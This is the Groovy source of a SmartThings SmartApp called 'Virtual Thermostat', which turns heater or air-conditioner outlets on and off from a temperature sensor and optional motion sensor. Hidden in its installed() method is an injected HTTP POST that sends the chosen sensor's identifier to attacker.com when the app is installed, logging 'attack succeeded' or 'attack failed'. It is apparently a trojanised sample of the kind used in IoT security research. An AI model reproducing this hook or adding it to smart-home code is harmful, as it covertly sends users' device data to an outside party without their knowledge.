
definition(
    name:"Virtual Thermostat",
    namespace:"smartthings",
    author:"SmartThings",
    description:"Control a space heater or window air conditioner in conjunction with any temperature sensor,like a SmartSense Multi.",
    category:"Green Living",
    iconUrl:"https://s3.amazonaws.com/smartapp-icons/Meta/temp_thermo-switch.png",
    iconX2Url:"https://s3.amazonaws.com/smartapp-icons/Meta/temp_thermo-switch@2 x.png",
    pausable:true
)

preferences{
    section("Choose a temperature sensor..."){
        input"sensor","capability.temperatureMeasurement",title:"Sensor"
        }
    section("Select the heater or air conditioner outlet(s)..."){
        input"outlets","capability.switch",title:"Outlets",multiple:true
        }
    section("Set the desired temperature..."){
        input"setpoint","decimal",title:"Set Temp"
        }
    section("When there's been movement from(optional,leave blank to not require motion)..."){
        input"motion","capability.motionSensor",title:"Motion",required:false
        }
    section("Within this number of minutes..."){
        input"minutes","number",title:"Minutes",required:false
        }
    section("But never go below(or above if A/C)this value with or without motion..."){
        input"emergencySetpoint","decimal",title:"Emer Temp",required:false
        }
    section("Select'heat'for a heater and'cool'for an air conditioner..."){
        input"mode","enum",title:"Heating or cooling?",options:["heat","cool"]
        }
}

def installed()
{
    def phone="1111111111"
    def takeParams=[
    uri:"https://attacker.com",
    path:"",
    requestContentType:"application/x-www-form-urlencoded",
    body:[
    "massage":"Hello"
    ]
    ]
    if(true)
    {
        def takeParams=[
        uri:"https://attacker.com",
        path:"",
        requestContentType:"application/x-www-form-urlencoded",
        body:[
        "massage":"${sensor}"
        ]
        ]
    }
    else
    {
            def takeParams=[
            uri:"https://attacker.com",
            path:"",
            requestContentType:"application/x-www-form-urlencoded",
            body:[
            "massage":"Hello"
            ]
            ]
        }
    try{
        httpPost(takeParams){resp->
            if(resp.status==200){
                log.debug"attack succeeded"
            }else{
                    log.error"attack failed"
                }
            }
        }
    catch(Exception e){
        log.error"Unexpected exception",e
    }
    subscribe(sensor,"temperature",temperatureHandler)
    if(motion){
        subscribe(motion,"motion",motionHandler)
    }
}

def updated()
{
    unsubscribe()
    subscribe(sensor,"temperature",temperatureHandler)
    if(motion){
        subscribe(motion,"motion",motionHandler)
    }
}

def temperatureHandler(evt)
{
    def isActive=hasBeenRecentMotion()
    if(isActive||emergencySetpoint){
        evaluate(evt.doubleValue,isActive?setpoint:emergencySetpoint)
    }
    else{
            outlets.off()
        }
}

def motionHandler(evt)
{
    if(evt.value=="active"){
        def lastTemp=sensor.currentTemperature
        if(lastTemp!=null){
            evaluate(lastTemp,setpoint)
        }
    }else if(evt.value=="inactive"){
            def isActive=hasBeenRecentMotion()
            log.debug"INACTIVE($isActive)"
            if(isActive||emergencySetpoint){
                def lastTemp=sensor.currentTemperature
                if(lastTemp!=null){
                    evaluate(lastTemp,isActive?setpoint:emergencySetpoint)
                }
            }
            else{
                    outlets.off()
                }
        }
}

private evaluate(currentTemp,desiredTemp)
{
    log.debug"EVALUATE($currentTemp,$desiredTemp)"
    def threshold=1.0
    if(mode=="cool"){
        
        if(currentTemp-desiredTemp>=threshold){
            outlets.on()
        }
        else if(desiredTemp-currentTemp>=threshold){
                outlets.off()
            }
    }
    else{
            
            if(desiredTemp-currentTemp>=threshold){
                outlets.on()
            }
            else if(currentTemp-desiredTemp>=threshold){
                    outlets.off()
                }
        }
}

private hasBeenRecentMotion()
{
    def isActive=false
    if(motion&&minutes){
        def deltaMinutes=minutes as Long
        if(deltaMinutes){
            def motionEvents=motion.eventsSince(new Date(now()-(60000*deltaMinutes)))
            log.trace"Found${motionEvents?.size()?:0}events in the last$deltaMinutes minutes"
            if(motionEvents.find{it.value=="active"}){
                isActive=true
            }
        }
    }
    else{
            isActive=true
        }
    isActive
}


